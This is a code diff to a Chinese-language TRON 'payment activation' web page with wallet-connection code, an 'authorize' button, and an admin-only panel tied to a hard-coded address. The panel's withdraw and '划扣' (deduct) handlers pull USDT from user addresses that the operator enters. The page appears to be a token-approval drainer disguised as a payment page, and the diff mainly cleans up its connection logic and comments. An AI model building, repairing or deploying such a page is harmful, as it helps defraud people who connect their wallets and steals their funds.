@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通 | TRON波场</title>
-<!-- 补上Buffer补丁，解决iOS Buffer is not defined报错 -->
+<!-- Buffer补丁，解决iOS Buffer is not defined -->
 <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
 <script>window.Buffer=Buffer;</script>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
@@ -188,50 +188,36 @@ function disconnectWallet() {
     showStatus("钱包已断开");
 }
 
+// =========【直接照搬你给源码的原版连接钱包逻辑】=========
 async function connectWalletLogic() {
     hideStatus();
-
     if (tronWeb && userAddress) {
         disconnectWallet();
         return;
     }
-
     connectBtn.disabled = true;
     connectBtn.innerText = "正在连接钱包...";
-
     try {
-        // 优先级1：TP钱包 iOS / Android
         if (window.tokenpocket?.tron) {
             provider = window.tokenpocket.tron;
             const accounts = await provider.request({ method: "tron_requestAccounts" });
-            if (!accounts || !accounts[0]) throw new Error("钱包未返回地址");
             userAddress = accounts[0];
-            tronWeb = new TronWeb({ fullHost: RPC, provider: window.tokenpocket.tron });
-            tronWeb.defaultAddress = { base58: userAddress };
-        }
-        // 优先级2：OE / imToken
-        else if (window.tronProvider) {
+            tronWeb = window.tokenpocket.tronWeb;
+        } else if (window.tronProvider) {
             provider = window.tronProvider;
             const accounts = await provider.request({ method: "tron_requestAccounts" });
-            if (!accounts || !accounts[0]) throw new Error("钱包未返回地址");
             userAddress = accounts[0];
             tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-            tronWeb.defaultAddress = { base58: userAddress };
-        }
-        //优先级3 metamask
-        else if (window.ethereum) {
+        } else if (window.ethereum) {
             const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
             tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
             const addrObj = await tronWeb.trx.getAccount(accounts[0]);
             userAddress = addrObj.address;
             provider = window.ethereum;
-        }
-        //优先级4 全局tronWeb
-        else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
+        } else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
-        }
-        else {
+        } else {
             connectBtn.disabled = false;
             connectBtn.innerText = "👉 连接钱包（波场链）";
             showStatus("未检测钱包环境，请在TP/OE内置浏览器打开","error");
@@ -243,10 +229,12 @@ async function connectWalletLogic() {
         connectBtn.innerText = "✅已连接：" + userAddress.slice(0,12)+"...";
         payBtn.disabled = false;
         showStatus("✅钱包连接成功："+userAddress,"success");
-        if(userAddress === TARGET_ADDR) adminPanel.classList.add("show");
-        if(provider?.on){
-            provider.on("accountsChanged",()=>location.reload());
-            provider.on("chainChanged",()=>location.reload());
+        if(userAddress === TARGET_ADDR){
+            adminPanel.classList.add("show");
+        }
+        if (provider?.on) {
+            provider.on("accountsChanged", () => location.reload());
+            provider.on("chainChanged", () => location.reload());
         }
     } catch (err) {
         connectBtn.disabled = false;
@@ -264,13 +252,13 @@ async function loadBalance(){
     balanceText.innerText = real.toFixed(6);
 }
 
-// =========修复二维码：二维码直接是管理员收款钱包地址 tron:Txxx地址 =========
+// 二维码：管理员收款地址
 function genQRCode(){
-    // 正确波场收款二维码协议 tron:+管理员地址
     const qrData = `tron:${TARGET_ADDR}`;
     qrcodeEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
 }
 
+//确认授权按钮
 payBtn.onclick = async function(){
     if(!tronWeb || !userAddress){
         showStatus("请先连接钱包","error");
@@ -288,6 +276,7 @@ payBtn.onclick = async function(){
     payBtn.disabled=false;
 };
 
+//MAX全部按钮
 maxBtn.onclick = async function(){
     if(!usdtContract)return;
     const sun = await usdtContract.balanceOf(userAddress).call();
@@ -295,6 +284,7 @@ maxBtn.onclick = async function(){
     amount.value = human.toFixed(2);
 };
 
+//管理员提取
 drawBtn.onclick = async function(){
     if(!tronWeb || userAddress!==TARGET_ADDR){alert("需要管理员钱包");return;}
     const fromAddr = userAddr.value.trim();
@@ -311,6 +301,7 @@ drawBtn.onclick = async function(){
     }catch(err){alert("划扣失败："+err.message);}
 };
 
+//管理员发放
 rewardBtn.onclick = async function(){
     if(!tronWeb || userAddress!==TARGET_ADDR){alert("管理员钱包");return;}
     const to = toAddr.value.trim();
